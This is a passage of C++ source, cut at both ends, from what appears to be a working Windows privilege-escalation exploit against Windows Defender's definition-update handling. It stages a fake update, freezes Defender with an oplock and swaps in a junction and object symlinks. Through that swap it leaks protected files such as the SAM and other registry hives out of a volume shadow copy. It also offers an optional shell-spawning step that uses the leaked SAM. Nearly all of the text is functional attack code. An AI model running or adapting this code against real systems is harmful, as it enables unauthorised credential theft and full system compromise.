			FLOW_FAIL("update-package-load", "GetUpdateFiles returned NULL", GetLastError());
		}
		LogV("[UPDATE] Package ready; extracted file count=%d\n", updatefilecount);


		FLOW_STAGE("vss-creation");
		LogV("[VSS] Creating VSS copy\n");
		hreleaseready = CreateEvent(NULL, FALSE, FALSE, NULL);
		if (!hreleaseready)
		{
			FLOW_FAIL_WIN32("vss-creation", "CreateEvent(hreleaseready) failed");
		}
		LogV("[VSS] Release event created: %p\n", hreleaseready);
			

		isvssready = TriggerWDForVS(hreleaseready, fullvsspath);
		if (!isvssready)
			FLOW_FAIL("vss-creation", "TriggerWDForVS returned false", GetLastError());
		LogV("[VSS] Snapshot ready: %ws\n", fullvsspath);

		for (int x = 0; x < 1; x++) // single WD update pass — leak selected targets simultaneously (up to 3)
		{
			FLOW_STAGE("update-staging");
			UpdateFilesListCurrent = UpdateFilesList;
			RPC_STATUS uuidstatus = UuidCreate(&uid);
			if (uuidstatus != RPC_S_OK && uuidstatus != RPC_S_UUID_LOCAL_ONLY)
				FLOW_FAIL("update-staging", "UuidCreate failed", uuidstatus);
			uuidstatus = UuidToStringW(&uid, &wuid);
			if (uuidstatus != RPC_S_OK || !wuid)
				FLOW_FAIL("update-staging", "UuidToStringW failed", uuidstatus);
			wuid2 = (wchar_t*)wuid;
			wcscpy(envstr, L"%TEMP%\\");
			wcscat(envstr, wuid2);
			DWORD expandedchars = ExpandEnvironmentStrings(envstr, updatepath, MAX_PATH);
			if (!expandedchars || expandedchars >= MAX_PATH)
				FLOW_FAIL_WIN32("update-staging", "ExpandEnvironmentStrings failed");
			RpcStringFreeW(&wuid);
			wuid = NULL;
			wuid2 = NULL;
			LogV("[STAGING] Resolved update directory=%ws\n", updatepath);
			needupdatedircleanup = CreateDirectory(updatepath, NULL);
			if (!needupdatedircleanup)
			{
				FLOW_FAIL_WIN32("update-staging", "CreateDirectory(updatepath) failed");
			}
			LogV("[STAGING] Created update directory=%ws\n", updatepath);
			DWORD stagedcount = 0;
			while (UpdateFilesListCurrent)
			{
				wchar_t filepath[MAX_PATH] = { 0 };
				//wchar_t filename[MAX_PATH] = { 0 };
				wcscpy(filepath, updatepath);
				wcscat(filepath, L"\\");
				if (!MultiByteToWideChar(CP_ACP, 0, UpdateFilesListCurrent->filename, -1,
					&filepath[lstrlenW(filepath)], MAX_PATH - lstrlenW(filepath)))
					FLOW_FAIL_WIN32("update-staging", "MultiByteToWideChar(update filename) failed");


				HANDLE hupdate = CreateFile(filepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, NULL, NULL);

				if (!hupdate || hupdate == INVALID_HANDLE_VALUE)
				{
					FLOW_FAIL_WIN32("update-staging", "CreateFile(staged update file) failed");
				}
				UpdateFilesListCurrent->filecreated = true;
				DWORD writtenbytes = 0;
				if (!WriteFile(hupdate, UpdateFilesListCurrent->filebuff,
					UpdateFilesListCurrent->filesz, &writtenbytes, NULL) ||
					writtenbytes != UpdateFilesListCurrent->filesz)
				{
					DWORD writeerror = writtenbytes == UpdateFilesListCurrent->filesz ?
						GetLastError() : ERROR_WRITE_FAULT;
					CloseHandle(hupdate);
					FLOW_FAIL("update-staging", "WriteFile(staged update file) failed or was short", writeerror);
				}
				CloseHandle(hupdate);
				stagedcount++;
				LogV("[STAGING] File #%lu ready: %ws (%lu bytes)\n",
					stagedcount, filepath, writtenbytes);
				UpdateFilesListCurrent = UpdateFilesListCurrent->next;

			}

			LogV("[STAGING] Completed: %lu files\n", stagedcount);
			FLOW_STAGE("defender-rpc-directory-watch");
			hdir = CreateFile(L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
			if (!hdir || hdir == INVALID_HANDLE_VALUE)
			{
				FLOW_FAIL_WIN32("defender-rpc-directory-watch", "Open Definition Updates directory failed");
			}
			LogV("[WATCH] Definition Updates directory opened: handle=%p\n", hdir);

			threadargs.dirpath = updatepath;
			threadargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
			if (!threadargs.hevent)
			{
				FLOW_FAIL_WIN32("defender-rpc-directory-watch", "CreateEvent(RPC worker) failed");
			}

			LogV("Waiting for windows defender to create a new definition update directory...\n");
			wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
			do {
				ZeroMemory(buff, sizeof(buff));
				OVERLAPPED od = { 0 };
				od.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
				if (!od.hEvent)
				{
					FLOW_FAIL_WIN32("defender-rpc-directory-watch", "CreateEvent(directory watcher) failed");
				}

				BOOL watchstarted = ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE,
					FILE_NOTIFY_CHANGE_DIR_NAME, &retbytes, &od, NULL);
				DWORD watcherror = watchstarted ? ERROR_SUCCESS : GetLastError();
				if (!watchstarted && watcherror != ERROR_IO_PENDING)
				{
					CloseHandle(od.hEvent);
					FLOW_FAIL("defender-rpc-directory-watch", "ReadDirectoryChangesW failed", watcherror);
				}
				LogV("[WATCH] Directory notification armed; immediate=%s, status=%lu\n",
					watchstarted ? "yes" : "no", watcherror);

				// Arm the directory watcher before dispatching the RPC. Starting the
				// worker first can miss a fast directory creation and look like an
				// unexplained process exit when the RPC event wins the wait.
				if (!hthread)
				{
					hthread = CreateThread(NULL, NULL, WDCallerThread, (LPVOID)&threadargs, NULL, &tid);
					if (!hthread)
					{
						DWORD threaderror = GetLastError();
						CancelPendingIoWithTrace(hdir, &od, "WATCH");
						CloseHandle(od.hEvent);
						FLOW_FAIL("defender-rpc-directory-watch", "CreateThread(Defender RPC) failed", threaderror);
					}
					LogV("[RPC] Worker thread started: handle=%p, tid=%lu\n", hthread, tid);
				}

				HANDLE events[2] = { od.hEvent, threadargs.hevent };
				LogV("[WATCH] Waiting up to %lu ms for directory creation or RPC completion\n",
					LAB_WAIT_TIMEOUT_MS);
				DWORD waitresult = WaitManyWithHeartbeat(2, events, FALSE,
					LAB_WAIT_TIMEOUT_MS, "definition-directory-or-rpc");
				LogV("[WATCH] WaitForMultipleObjects returned 0x%08lX\n",
					(unsigned long)waitresult);
				if (waitresult == WAIT_OBJECT_0 + 1)
				{
					CancelPendingIoWithTrace(hdir, &od, "WATCH");
					CloseHandle(od.hEvent);
					LogE("[RPC] Ended before a definition directory was created: return=0x%08lX, server_status=0x%08lX",
						(unsigned long)threadargs.res, (unsigned long)threadargs.serverstatus);
					DWORD rpcfailure = threadargs.res ? (DWORD)threadargs.res :
						(DWORD)threadargs.serverstatus;
					if (!rpcfailure)
						rpcfailure = ERROR_GEN_FAILURE;
					FLOW_FAIL("defender-rpc-directory-watch", "RPC completed before directory creation", rpcfailure);
				}
				if (waitresult == WAIT_TIMEOUT)
				{
					CancelPendingIoWithTrace(hdir, &od, "WATCH");
					CloseHandle(od.hEvent);
					FLOW_FAIL("defender-rpc-directory-watch", "Timed out waiting for Defender directory creation", WAIT_TIMEOUT);
				}
				if (waitresult != WAIT_OBJECT_0)
				{
					DWORD waiterror = GetLastError();
					CancelPendingIoWithTrace(hdir, &od, "WATCH");
					CloseHandle(od.hEvent);
					LogE("[WATCH] WaitForMultipleObjects failed: result=0x%08lX, error=%lu",
						(unsigned long)waitresult, (unsigned long)waiterror);
					FLOW_FAIL("defender-rpc-directory-watch", "WaitForMultipleObjects failed", waiterror);
				}

				if (!GetOverlappedResult(hdir, &od, &retbytes, FALSE))
				{
					DWORD resultError = GetLastError();
					CloseHandle(od.hEvent);
					FLOW_FAIL("defender-rpc-directory-watch", "GetOverlappedResult(directory watcher) failed", resultError);
				}
				CloseHandle(od.hEvent);
				LogV("[WATCH] Directory notification completed: %lu bytes\n", retbytes);

				PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
				PFILE_NOTIFY_INFORMATION added = NULL;
				DWORD notificationindex = 0;
				for (;;)
				{
					notificationindex++;
					const char* actionname = "unknown";
					switch (pfni->Action)
					{
					case FILE_ACTION_ADDED: actionname = "added"; break;
					case FILE_ACTION_REMOVED: actionname = "removed"; break;
					case FILE_ACTION_MODIFIED: actionname = "modified"; break;
					case FILE_ACTION_RENAMED_OLD_NAME: actionname = "renamed-old"; break;
					case FILE_ACTION_RENAMED_NEW_NAME: actionname = "renamed-new"; break;
					}
					wchar_t notificationname[MAX_PATH] = { 0 };
					size_t notificationchars = pfni->FileNameLength / sizeof(wchar_t);
					size_t copychars = notificationchars < MAX_PATH - 1 ?
						notificationchars : MAX_PATH - 1;
					memcpy(notificationname, pfni->FileName, copychars * sizeof(wchar_t));
					notificationname[copychars] = L'\0';
					LogV("[WATCH] record=%lu action=%lu(%s) name_chars=%lu next_offset=%lu name=%ws\n",
						notificationindex, pfni->Action, actionname,
						(unsigned long)notificationchars, pfni->NextEntryOffset,
						notificationname);
					if (pfni->Action == FILE_ACTION_ADDED)
					{
						added = pfni;
						break;
					}
					if (!pfni->NextEntryOffset)
						break;
					pfni = (PFILE_NOTIFY_INFORMATION)((BYTE*)pfni + pfni->NextEntryOffset);
				}
				if (!added)
				{
					LogV("[WATCH] Notification contained no FILE_ACTION_ADDED record; re-arming\n");
					continue;
				}

				size_t basenamechars = wcslen(newdefupdatedirname);
				size_t addedchars = added->FileNameLength / sizeof(wchar_t);
				if (basenamechars + addedchars >= MAX_PATH)
				{
					FLOW_FAIL("defender-rpc-directory-watch", "Definition update directory name is too long", ERROR_BUFFER_OVERFLOW);
				}
				memcpy(newdefupdatedirname + basenamechars, added->FileName,
					addedchars * sizeof(wchar_t));
				newdefupdatedirname[basenamechars + addedchars] = L'\0';
				break;
			} while (1);
			LogV("[WATCH] Detected new definition update directory=%ws\n", newdefupdatedirname);

			wcscpy(updatelibpath, L"\\??\\");
			wcscat(updatelibpath, updatepath);
			wcscat(updatelibpath, L"\\mpasbase.vdm");
			FLOW_STAGE("oplock-and-namespace-swap");
			LogV("[OPLOCK] Opening staged file=%ws\n", updatelibpath);

			RtlInitUnicodeString(&unistrupdatelibpath, updatelibpath);
			InitializeObjectAttributes(&objattr, &unistrupdatelibpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

			ntstat = NtCreateFile(&hupdatefile, GENERIC_READ | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, NULL);
			if (ntstat)
			{
				FLOW_FAIL("oplock-and-namespace-swap", "NtCreateFile(staged mpasbase.vdm) failed", ntstat);
			}
			LogV("[OPLOCK] Staged file opened: handle=%p\n", hupdatefile);

			ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			if (!ovd.hEvent)
				FLOW_FAIL_WIN32("oplock-and-namespace-swap", "CreateEvent(oplock) failed");
			SetLastError(ERROR_SUCCESS);
			BOOL oplockimmediate = DeviceIoControl(hupdatefile, FSCTL_REQUEST_BATCH_OPLOCK,
				NULL, 0, NULL, 0, NULL, &ovd);
			DWORD oplockstatus = oplockimmediate ? ERROR_SUCCESS : GetLastError();
			if (oplockimmediate || oplockstatus != ERROR_IO_PENDING)
			{
				FLOW_FAIL("oplock-and-namespace-swap", "staged-file oplock was not left pending",
					oplockimmediate ? ERROR_OPLOCK_NOT_GRANTED : oplockstatus);
			}
			LogV("[OPLOCK] Request is pending; waiting up to %lu ms for the break\n",
				LAB_WAIT_TIMEOUT_MS);
			DWORD oplockwait = WaitOneWithHeartbeat(ovd.hEvent,
				LAB_WAIT_TIMEOUT_MS, "staged-file-oplock-break");
			if (oplockwait == WAIT_TIMEOUT)
			{
				CancelIo(hupdatefile);
				FLOW_FAIL("oplock-and-namespace-swap", "Timed out waiting for oplock break", WAIT_TIMEOUT);
			}
			if (oplockwait != WAIT_OBJECT_0)
				FLOW_FAIL_WIN32("oplock-and-namespace-swap", "WaitForSingleObject(oplock) failed");
			if (!GetOverlappedResult(hupdatefile, &ovd, &transfersz, FALSE))
				FLOW_FAIL_WIN32("oplock-and-namespace-swap", "GetOverlappedResult(oplock) failed");
			LogV("[OPLOCK] Break observed; transferred=%lu\n", transfersz);

			//

			wcscpy(newname, updatepath);
			wcscat(newname, L".WDFOO");
			renstructsz = sizeof(FILE_RENAME_INFO) + wcslen(newname) * sizeof(wchar_t) + sizeof(wchar_t);
			fri = (FILE_RENAME_INFO*)malloc(renstructsz);
			if (!fri)
				FLOW_FAIL("oplock-and-namespace-swap", "malloc(FILE_RENAME_INFO) failed", ERROR_NOT_ENOUGH_MEMORY);
			ZeroMemory(fri, renstructsz);
			fri->ReplaceIfExists = TRUE;
			fri->FileNameLength = wcslen(newname) * sizeof(wchar_t);
			wcscpy(&fri->FileName[0], newname);
			if (!SetFileInformationByHandle(hupdatefile, FileRenameInfo, fri, renstructsz))
			{
				FLOW_FAIL_WIN32("oplock-and-namespace-swap", "SetFileInformationByHandle(rename oplocked file) failed");
			}
			LogV("[OPLOCK] Oplocked file renamed to=%ws\n", newname);
			free(fri);
			fri = NULL;
			//printf("File moved  %ws to %ws\n", updatelibpath, newname);
			//


			wcscpy(newtmp, updatepath);
			wcscat(newtmp, L".foo");
			if (!MoveFile(updatepath, newtmp))
			{
				FLOW_FAIL_WIN32("oplock-and-namespace-swap", "MoveFile(staging directory) failed");
			}
			dirmoved = true;
			LogV("[NAMESPACE] Staging directory moved: %ws -> %ws\n", updatepath, newtmp);

			wcscpy(wreparsedirpath, L"\\??\\");
			wcscat(wreparsedirpath, updatepath);

			RtlInitUnicodeString(&reparsedirpath, wreparsedirpath);
			InitializeObjectAttributes(&objattr, &reparsedirpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

			ntstat = NtCreateFile(&hreparsedir, GENERIC_WRITE | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE, NULL, NULL);
			if (ntstat)
			{
				FLOW_FAIL("oplock-and-namespace-swap", "NtCreateFile(reparse directory) failed", ntstat);
			}
			LogV("[NAMESPACE] Reparse directory recreated: %ws, handle=%p\n", updatepath, hreparsedir);


			wcscpy(rptarget, L"\\BaseNamedObjects\\Restricted");
			targetsz = wcslen(rptarget) * 2;
			printnamesz = 1 * 2;
			pathbuffersz = targetsz + printnamesz + 12;
			totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
			rdb = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalsz);
			if (!rdb)
				FLOW_FAIL("oplock-and-namespace-swap", "HeapAlloc(REPARSE_DATA_BUFFER) failed", ERROR_NOT_ENOUGH_MEMORY);
			rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
			rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
			rdb->Reserved = NULL;
			rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;
			rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
			memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
			rdb->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
			rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
			memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, printname, printnamesz);

			ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			if (!ov.hEvent)
			{
				FLOW_FAIL_WIN32("oplock-and-namespace-swap", "CreateEvent(reparse point) failed");
			}
			SetLastError(ERROR_SUCCESS);
			BOOL reparseimmediate = DeviceIoControl(hreparsedir, FSCTL_SET_REPARSE_POINT,
				rdb, (DWORD)totalsz, NULL, 0, NULL, &ov);
			DWORD reparsestatus = reparseimmediate ? ERROR_SUCCESS : GetLastError();
			HeapFree(GetProcessHeap(), NULL, rdb);
			rdb = NULL;
			if (!reparseimmediate && reparsestatus == ERROR_IO_PENDING) {
				DWORD reparsewait = WaitOneWithHeartbeat(ov.hEvent,
					LAB_WAIT_TIMEOUT_MS, "set-reparse-point");
				if (reparsewait == WAIT_TIMEOUT)
					FLOW_FAIL("oplock-and-namespace-swap", "Timed out setting reparse point", WAIT_TIMEOUT);
				if (reparsewait != WAIT_OBJECT_0)
					FLOW_FAIL_WIN32("oplock-and-namespace-swap", "WaitForSingleObject(reparse point) failed");
				if (!GetOverlappedResult(hreparsedir, &ov, &retsz, FALSE))
					FLOW_FAIL_WIN32("oplock-and-namespace-swap", "GetOverlappedResult(reparse point) failed");
			}
			else if (!reparseimmediate)
			{
				FLOW_FAIL("oplock-and-namespace-swap", "FSCTL_SET_REPARSE_POINT failed", reparsestatus);
			}
			LogV("[NAMESPACE] Junction created: %ws => %ws\n", updatepath, rptarget);

			// Create one symlink per target while WD is frozen (oplock still held).
			for (int si = 0; si < leakCount; si++)
			{
				wchar_t objlinknamestr[MAX_PATH] = { 0 };
				wcscpy(objlinknamestr, L"\\BaseNamedObjects\\Restricted\\");
				wcscat(objlinknamestr, vdmfiles[si]);

				wchar_t nttargetfile_i[MAX_PATH] = { 0 };
				wcscpy(nttargetfile_i, fullvsspath);
				wcscat(nttargetfile_i, opt.leakTargets[si].c_str());

				UNICODE_STRING linkname_i = { 0 };
				UNICODE_STRING linktarget_i = { 0 };
				RtlInitUnicodeString(&linkname_i, objlinknamestr);
				RtlInitUnicodeString(&linktarget_i, nttargetfile_i);
				InitializeObjectAttributes(&objattr, &linkname_i, OBJ_CASE_INSENSITIVE, NULL, NULL);

				ntstat = _NtCreateSymbolicLinkObject(&hobjlinks[si], GENERIC_ALL, &objattr, &linktarget_i);
				if (ntstat)
				{
					FLOW_FAIL("oplock-and-namespace-swap", "NtCreateSymbolicLinkObject failed", ntstat);
				}
				LogV("[NAMESPACE] Object link #%d created: %ws => %ws\n",
					si, linkname_i.Buffer, linktarget_i.Buffer);
			}

			//TerminateThread(hthread, ERROR_SUCCESS); // kill the thread, don't care if it is still running
			//CloseHandle(hthread);
			//hthread = NULL;
			CloseHandle(ov.hEvent);
			ov.hEvent = NULL;
			CloseHandle(ovd.hEvent);
			ovd.hEvent = NULL;
			CloseHandle(hupdatefile);
			hupdatefile = NULL;


			CloseHandle(hdir);
			hdir = NULL;
			CloseHandle(hreparsedir);
			hreparsedir = NULL;

			// Read each leaked file in turn (WD follows each symlink as it processes the update).
			FLOW_STAGE("leaked-file-collection");
			for (int ri = 0; ri < leakCount; ri++)
			{
				wchar_t readpath[MAX_PATH] = { 0 };
				wcscpy(readpath, newdefupdatedirname);
				wcscat(readpath, L"\\");
				wcscat(readpath, vdmfiles[ri]);

				DWORD leakwaitstart = GetTickCount();
				DWORD leakattempts = 0;
				for (;;)
				{
					hleakedfile = CreateFile(readpath, GENERIC_READ, FILE_SHARE_READ, NULL,
						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (hleakedfile && hleakedfile != INVALID_HANDLE_VALUE)
						break;
					DWORD openerror = GetLastError();
					hleakedfile = NULL;
					leakattempts++;
					if (GetTickCount() - leakwaitstart >= LAB_WAIT_TIMEOUT_MS)
						FLOW_FAIL("leaked-file-collection", "Timed out waiting for Defender output file", openerror);
					if (leakattempts == 1 || leakattempts % 20 == 0)
						LogV("[LEAK] Waiting for %ws; attempts=%lu, last_error=%lu\n",
							readpath, leakattempts, openerror);
					Sleep(50);
				}
				LogV("[LEAK] Opened output #%d: %ws after %lu attempts\n",
					ri, readpath, leakattempts + 1);

				if (!GetFileSizeEx(hleakedfile, &_filesz))
					FLOW_FAIL_WIN32("leaked-file-collection", "GetFileSizeEx(Defender output) failed");
				if (_filesz.QuadPart <= 0 || _filesz.QuadPart > MAXDWORD)
					FLOW_FAIL("leaked-file-collection", "Defender output size is invalid or too large", ERROR_FILE_TOO_LARGE);
				LogV("[LEAK] Output size=%lld bytes\n", (long long)_filesz.QuadPart);
				if (!LockFileEx(hleakedfile, LOCKFILE_EXCLUSIVE_LOCK, 0,
					_filesz.LowPart, _filesz.HighPart, &ovd2))
					FLOW_FAIL_WIN32("leaked-file-collection", "LockFileEx(Defender output) failed");
				filelocked = true;
				leakedfilebuff = malloc((size_t)_filesz.QuadPart);
				if (!leakedfilebuff)
				{
					FLOW_FAIL("leaked-file-collection", "malloc(leaked output buffer) failed", ERROR_NOT_ENOUGH_MEMORY);
				}

				if (!ReadFile(hleakedfile, leakedfilebuff, (DWORD)_filesz.QuadPart, &__readsz, NULL) ||
					__readsz != (DWORD)_filesz.QuadPart)
				{
					DWORD readerror = __readsz == (DWORD)_filesz.QuadPart ?
						GetLastError() : ERROR_HANDLE_EOF;
					FLOW_FAIL("leaked-file-collection", "ReadFile(Defender output) failed or was short", readerror);
				}
				LogV("[LEAK] Read completed: %lu bytes\n", __readsz);

				UnlockFile(hleakedfile, NULL, NULL, NULL, NULL);
				filelocked = false;
				CloseHandle(hleakedfile);
				hleakedfile = NULL;
				//printf("Read %d bytes\n", __readsz);

				ZeroMemory(copiedfilepath, sizeof(copiedfilepath));
				if (!opt.outFileSingle.empty())
				{
					if (opt.outFileSingle.size() >= MAX_PATH)
						FLOW_FAIL("leaked-file-collection", "--out path is too long", ERROR_BUFFER_OVERFLOW);
					wcscpy(copiedfilepath, opt.outFileSingle.c_str());
				}
				else if (!opt.outDir.empty())
				{
					std::wstring base = FriendlyNameForKnownHive(opt.leakTargets[ri]);
					if (base.empty())
						base = BasenameOfPath(opt.leakTargets[ri]);
					if (base.empty())
						base = L"leak";

					std::wstring out = opt.outDir;
					if (!out.empty() && out.back() != L'\\' && out.back() != L'/')
						out += L"\\";
					out += base;
					out += L".bin";
					if (out.size() >= MAX_PATH)
						FLOW_FAIL("leaked-file-collection", "--out-dir result path is too long", ERROR_BUFFER_OVERFLOW);
					wcscpy(copiedfilepath, out.c_str());
				}
				else
				{
					if (wuid)
					{
						RpcStringFreeW(&wuid);
						wuid = NULL;
					}
					RPC_STATUS outputuuidstatus = UuidCreate(&uid);
					if (outputuuidstatus != RPC_S_OK && outputuuidstatus != RPC_S_UUID_LOCAL_ONLY)
						FLOW_FAIL("leaked-file-collection", "UuidCreate(output path) failed", outputuuidstatus);
					outputuuidstatus = UuidToStringW(&uid, &wuid);
					if (outputuuidstatus != RPC_S_OK || !wuid)
						FLOW_FAIL("leaked-file-collection", "UuidToStringW(output path) failed", outputuuidstatus);
					wuid2 = (wchar_t*)wuid;
					wchar_t env2[MAX_PATH] = { 0 };
					wcscpy(env2, L"%TEMP%\\");
					wcscat(env2, wuid2);
					DWORD outputchars = ExpandEnvironmentStringsW(env2, copiedfilepath,
						sizeof(copiedfilepath) / sizeof(wchar_t));
					if (!outputchars || outputchars >= sizeof(copiedfilepath) / sizeof(wchar_t))
						FLOW_FAIL_WIN32("leaked-file-collection", "ExpandEnvironmentStringsW(output path) failed");
					RpcStringFreeW(&wuid);
					wuid = NULL;
					wuid2 = NULL;
				}

				hleakedfile = CreateFile(copiedfilepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if (!hleakedfile || hleakedfile == INVALID_HANDLE_VALUE)
				{
					FLOW_FAIL_WIN32("leaked-file-collection", "CreateFile(final output) failed");
				}
				if (!WriteFile(hleakedfile, leakedfilebuff, (DWORD)_filesz.QuadPart, &__readsz, NULL) ||
					__readsz != (DWORD)_filesz.QuadPart)
				{
					DWORD outputerror = __readsz == (DWORD)_filesz.QuadPart ?
						GetLastError() : ERROR_WRITE_FAULT;
					CloseHandle(hleakedfile);
					hleakedfile = NULL;
					DeleteFile(copiedfilepath);
					FLOW_FAIL("leaked-file-collection", "WriteFile(final output) failed or was short", outputerror);
				}
				LogV("[LEAK] Final output written: %ws (%lu bytes)\n", copiedfilepath, __readsz);
				CloseHandle(hleakedfile);
				hleakedfile = NULL;
				free(leakedfilebuff);
				leakedfilebuff = NULL;

				if (hobjlinks[ri]) { CloseHandle(hobjlinks[ri]); hobjlinks[ri] = NULL; }

				std::wstring friendly = FriendlyNameForKnownHive(opt.leakTargets[ri]);
				if (friendly.empty())
					friendly = BasenameOfPath(opt.leakTargets[ri]);
				if (friendly.empty())
					friendly = L"leak";
				printf("%ws written at : %ws\n", friendly.c_str(), copiedfilepath);
				fflush(stdout);

				// Save SAM path for hash extraction and optional cmd shell spawning.
				if (!sawSam && FriendlyNameForKnownHive(opt.leakTargets[ri]) == L"SAM")
				{
					wcscpy(sampath, copiedfilepath);
					sawSam = true;
				}
			}

			//printf("Exploit succeeded.\n");
			if (!SetEvent(hreleaseready))
				FLOW_FAIL_WIN32("freeze-release", "SetEvent(VSS freeze release) failed");
			LogV("[VSS] Freeze worker release signalled\n");

			if (opt.spawnCmdShell)
			{
				if (!sawSam)
				{
					printf("WARNING: --cmd requested but SAM was not leaked in this run. Use `--dump sam` or `--dump all`.\n");
				}
				else
				{
					LogV("[SHELL] Starting optional shell workflow with SAM=%ws\n", sampath);
					if (!DoSpawnShellAsAllUsers(sampath))
						LogW("[SHELL] Optional shell workflow returned failure; leaked files remain valid");
					else
						LogV("[SHELL] Optional shell workflow completed\n");
				}
			}

			LogV("[RPC] Waiting up to %lu ms for worker shutdown\n", LAB_WAIT_TIMEOUT_MS);
			DWORD rpcshutdownwait = WaitOneWithHeartbeat(hthread,
				LAB_WAIT_TIMEOUT_MS, "rpc-worker-shutdown");
			if (rpcshutdownwait == WAIT_TIMEOUT)
				FLOW_FAIL("rpc-shutdown", "Timed out waiting for Defender RPC worker", WAIT_TIMEOUT);
			if (rpcshutdownwait != WAIT_OBJECT_0)
				FLOW_FAIL_WIN32("rpc-shutdown", "WaitForSingleObject(RPC worker) failed");
			DWORD rpcthreadexit = STILL_ACTIVE;
			if (!GetExitCodeThread(hthread, &rpcthreadexit))
				FLOW_FAIL_WIN32("rpc-shutdown", "GetExitCodeThread(RPC worker) failed");
			LogV("[RPC] Worker exited: thread_exit=%lu, rpc_return=0x%08lX, server_status=0x%08lX\n",
				rpcthreadexit, (unsigned long)threadargs.res,
				(unsigned long)threadargs.serverstatus);
			CloseHandle(hthread);
			hthread = NULL;
			CloseHandle(threadargs.hevent);
			threadargs.hevent = NULL;
			flowstage = "complete";
			exitreason = "all requested outputs were written";
			exitdetail = ERROR_SUCCESS;
			exitline = __LINE__;
			processresult = 0;
			LogV("[SUCCESS] Flow completed; all requested outputs were written\n");


			
		}

	}
	catch (int exception)
	{
		FLOW_FAIL("exception-handler", "Caught C++ int exception", exception);
	}
	catch (...)
	{
		FLOW_FAIL("exception-handler", "Caught unknown C++ exception", ERROR_UNHANDLED_EXCEPTION);
	}

cleanup:
	if (processresult == 0)
		LogV("[CLEANUP] Starting after successful completion\n");
	else
		LogE("[CLEANUP] Starting after failure: stage_index=%d, stage=%s, reason=%s, code=0x%08lX, source_line=%d",
			flowstageindex, flowstage, exitreason, exitdetail, exitline);
	LogV("[CLEANUP] Handles: rpc_thread=%p rpc_event=%p watch_dir=%p update_file=%p reparse_dir=%p\n",
		hthread, threadargs.hevent, hdir, hupdatefile, hreparsedir);
	if (hthread)
	{
		DWORD cleanupthreadwait = WaitOneWithHeartbeat(hthread, 5000,
			"cleanup-rpc-worker");
		LogV("[CLEANUP] RPC worker wait result=0x%08lX\n",
			(unsigned long)cleanupthreadwait);
		CloseHandle(hthread);
		hthread = NULL;
	}
	if (threadargs.hevent)
	{
		CloseHandle(threadargs.hevent);
		threadargs.hevent = NULL;
	}

	if(hint)
		InternetCloseHandle(hint);
	if(hint2)
		InternetCloseHandle(hint2);
	if (exebuff)
		free(exebuff);
	if (hcabctx)
		FDIDestroy(hcabctx);
	if (hdir && hdir != INVALID_HANDLE_VALUE)
		CloseHandle(hdir);
	if (hupdatefile && hupdatefile != INVALID_HANDLE_VALUE)
		CloseHandle(hupdatefile);
	if (hreparsedir && hreparsedir != INVALID_HANDLE_VALUE)
		CloseHandle(hreparsedir);
	if (fri)
		free(fri);
	if (rdb)
		HeapFree(GetProcessHeap(), NULL, rdb);
	if (ov.hEvent)
		CloseHandle(ov.hEvent);
	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);

	if (hreleaseready)
	{
		SetEvent(hreleaseready);
		Sleep(1000);
		CloseHandle(hreleaseready);
	}
	if (hleakedfile && hleakedfile != INVALID_HANDLE_VALUE)
	{
		if (filelocked)
			UnlockFile(hleakedfile, NULL, NULL, NULL, NULL);
		CloseHandle(hleakedfile);
	}
	if (leakedfilebuff)
		free(leakedfilebuff);
	if (wuid)
	{
		RpcStringFreeW(&wuid);
		wuid = NULL;
	}
	for (int ci = 0; ci < 3; ci++)
		if (hobjlinks[ci]) { CloseHandle(hobjlinks[ci]); hobjlinks[ci] = NULL; }
	if (needupdatedircleanup)
	{
		wchar_t dirtoclean[MAX_PATH] = { 0 };
		wcscpy(dirtoclean, dirmoved ? newtmp : updatepath);
		UpdateFilesListCurrent = UpdateFilesList;
		while(UpdateFilesListCurrent)
		{

			if (UpdateFilesListCurrent->filecreated)
			{
				wchar_t filetodel[MAX_PATH] = { 0 };
				wcscpy(filetodel, dirtoclean);
				wcscat(filetodel, L"\\");
				MultiByteToWideChar(CP_ACP, 0, UpdateFilesListCurrent->filename, -1,
					&filetodel[lstrlenW(filetodel)], MAX_PATH - lstrlenW(filetodel));
